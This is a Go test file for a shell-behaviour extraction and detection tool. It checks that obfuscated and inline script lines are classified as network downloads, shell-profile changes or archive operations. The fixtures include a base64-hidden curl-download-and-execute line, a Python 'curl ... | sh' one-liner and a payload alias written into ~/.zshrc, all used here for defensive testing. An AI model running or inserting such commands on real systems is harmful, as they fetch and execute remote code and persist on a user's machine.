package extract

import (
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestExtractTextAnalyzesSupportedShellToolsAtTheSemanticGate(t *testing.T) {
	tests := []struct {
		name          string
		line          string
		operationKind string
	}{
		{
			name:          "literal base64 pipeline",
			line:          `echo Y3VybCBodHRwczovL2RlY29kZWQuZXhhbXBsZS9wIC1vIC90bXAveDsgY2htb2QgK3ggL3RtcC94OyAvdG1wL3g= | base64 -D | sh`,
			operationKind: "network.download",
		},
		{
			name:          "delegated URL open",
			line:          `open https://browser.example/login`,
			operationKind: "network.connect",
		},
		{
			name:          "shell profile redirection",
			line:          `printf '%s\n' 'alias update=/tmp/payload' >> ~/.zshrc`,
			operationKind: "shell.profile.modify",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:           "node-0001",
				LogicalPath:      "input.sh",
				Kind:             "script",
				MediaType:        "text/plain",
				SemanticLanguage: "shell",
				Role:             "target",
				Data:             []byte(tt.line),
			})
			if !extractGraphHasOperationKind(graph, behavior.OperationKind(tt.operationKind)) {
				t.Fatalf("supported shell line did not reach %q analysis: operations=%#v coverage=%#v", tt.operationKind, graph.Operations, graph.Coverage)
			}
		})
	}
}

func TestExtractTextInlineInterpreterUsesRecoveredLanguage(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:           "node-0001",
		LogicalPath:      "input.sh",
		Kind:             "script",
		MediaType:        "text/plain",
		SemanticLanguage: "shell",
		Role:             "target",
		Data:             []byte(`python -c 'import os; os.system("curl https://python-system.example/p | sh")'`),
	})
	if !extractGraphHasOperationKind(graph, "network.download") {
		t.Fatalf("Python inline code inherited shell semantics: operations=%#v coverage=%#v", graph.Operations, graph.Coverage)
	}
	if !hasOperationFlowRelation(graph.Relations) || !hasRelationKind(graph.Relations, behavior.RelationPipesTo) {
		t.Fatalf("embedded shell behavior was not recovered from Python inline code: %#v", graph.Relations)
	}
}

func TestExtractTextShellArchiveOptionIsNotSensitiveResource(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:           "node-0001",
		LogicalPath:      "input.sh",
		Kind:             "script",
		MediaType:        "text/plain",
		SemanticLanguage: "shell",
		Role:             "target",
		Data:             []byte(`tar --exclude ~/.ssh/id_rsa -czf /tmp/out.tgz /tmp/src`),
	})
	if !extractGraphHasOperationKind(graph, "archive.create") {
		t.Fatalf("archive operation was not modeled: %#v", graph.Operations)
	}
	for _, operation := range graph.Operations {
		if operation.Kind == "file.read" && operation.RequiredResource().HasClassification(behavior.ResourceClassSSHPrivateKey) {
			t.Fatalf("archive option value became a sensitive read: %#v", graph.Operations)
		}
	}
	for _, feature := range graph.Features {
		if feature.Key == "script.sensitive_resource" && feature.Qualifiers["category"] == "ssh-private-key" {
			t.Fatalf("archive option value became a corroboratable sensitive resource: %#v", graph.Features)
		}
	}
}

func extractGraphHasOperationKind(graph behavior.Graph, kind behavior.OperationKind) bool {
	for _, operation := range graph.Operations {
		if operation.Kind == kind {
			return true
		}
	}
	return false
}
